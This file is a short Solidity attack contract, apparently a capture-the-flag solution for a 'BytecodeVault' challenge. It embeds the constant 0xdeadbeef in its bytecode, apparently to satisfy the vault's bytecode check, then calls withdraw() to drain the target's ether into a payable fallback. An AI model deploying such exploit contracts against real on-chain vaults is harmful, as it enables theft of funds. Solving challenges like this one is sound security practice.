//SPDX-License-Identifier: MIT
pragma solidity ^0.5.11;
import "./BytecodeVault.sol";

contract BytecodeVaultAttackMetaTrust23 {
    address owner;
    function attack(address target) public{
        uint a = 0xdeadbeef;
        owner = msg.sender;
        require(a == 0xdeadbeef);
        BytecodeVaultMetaTrust23 v = BytecodeVaultMetaTrust23(target);
        v.withdraw();
    }

    function() external payable { }
}